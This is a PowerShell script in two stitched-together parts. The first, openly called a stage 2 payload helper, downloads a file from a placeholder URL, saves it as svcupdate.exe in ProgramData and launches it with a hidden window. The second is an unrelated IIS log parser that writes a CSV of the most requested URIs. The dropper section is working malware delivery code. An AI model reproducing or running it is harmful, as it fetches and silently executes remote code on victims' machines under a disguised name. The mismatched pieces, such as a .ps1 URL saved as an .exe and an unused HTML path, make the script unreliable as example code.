
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://example.com:443/stage1.ps1",
    [string]$LocalPath = "C:\ProgramData\svcupdate.exe",
    [int]$RequestTimeout = 135,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $StageResult = Get-Stage2Payload -SourceUrl $Stage2Url -DestinationPath $LocalPath -TimeoutSec $RequestTimeout -UserAgent $UserAgent
    if ($StageResult) {
        Start-Process -FilePath $LocalPath -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Set-Location -Path $env:TEMP
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$LogRoot    = "D:\Logs\iis\W3SVC1"
$Days       = 7
$TopN       = 10
$OutputPath = 'D:\Ops\reports\iis-top-2025-04-03.csv'
$HtmlPath   = 'D:\Ops\reports\iis-2025-04-03.html'
$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
